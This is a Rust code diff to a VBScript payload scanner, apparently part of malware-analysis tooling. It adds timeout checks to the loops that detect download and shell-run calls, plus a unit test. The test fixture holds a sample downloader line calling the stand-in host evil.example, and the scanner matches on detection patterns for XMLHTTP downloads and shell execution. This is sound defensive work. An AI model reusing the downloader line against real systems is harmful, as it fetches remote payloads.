@@ -58,11 +58,20 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
     let payloads: Vec<Vec<u8>> = env.all_extracted_vbs.clone();
     let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
     for (idx, payload) in payloads.iter().enumerate() {
+        if env.check_deadline() {
+            break;
+        }
         let raw = String::from_utf8_lossy(payload);
         let text = join_vbs_line_continuations(&raw);
         let mut bindings: VbsStringBindings = HashMap::new();
         let mut array_bindings: VbsArrayBindings = HashMap::new();
-        for caps in VBS_STRING_ASSIGN_RE.captures_iter(&text) {
+        for line in text.lines() {
+            if env.check_deadline() {
+                return;
+            }
+            let Some(caps) = VBS_STRING_ASSIGN_RE.captures(line) else {
+                continue;
+            };
             let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
                 continue;
             };
@@ -84,6 +93,9 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
         let regexes: &[&Lazy<Regex>] = &[&XMLHTTP_OPEN_RE, &URLDOWN_RE];
         for re in regexes {
             for caps in re.captures_iter(&text) {
+                if env.check_deadline() {
+                    return;
+                }
                 let Some(url_match) = caps.get(1) else {
                     continue;
                 };
@@ -104,6 +116,9 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
         }
 
         for caps in SHELL_RUN_RE.captures_iter(&text) {
+            if env.check_deadline() {
+                return;
+            }
             let Some(command) = caps.get(1).map(|m| m.as_str()) else {
                 continue;
             };
@@ -111,6 +126,9 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
         }
 
         for caps in SHELL_RUN_VAR_RE.captures_iter(&text) {
+            if env.check_deadline() {
+                return;
+            }
             let Some(var_match) = caps.get(1) else {
                 continue;
             };
@@ -122,6 +140,9 @@ pub fn scan_vbs_payloads(env: &mut Environment) {
 
         for re in [&XMLHTTP_OPEN_VAR_RE, &URLDOWN_VAR_RE] {
             for caps in re.captures_iter(&text) {
+                if env.check_deadline() {
+                    return;
+                }
                 let Some(var_match) = caps.get(1) else {
                     continue;
                 };
@@ -528,4 +549,33 @@ fn split_vbs_args(expr: &str) -> Vec<&str> {
     }
     parts.push(expr[start..].trim());
     parts
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::time::{Duration, Instant};
+
+    #[test]
+    fn vbs_scan_honors_expired_deadline() {
+        let mut env = Environment::default();
+        env.limits.deadline = Some(Instant::now() - Duration::from_secs(1));
+        env.all_extracted_vbs
+            .push(br#"x.Open "GET", "http://evil.example/p", False"#.to_vec());
+
+        scan_vbs_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "no TimeoutHit emitted: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { .. })),
+            "deadline-expired scan still emitted Download: {:?}",
+            env.traits
+        );
+    }
 }
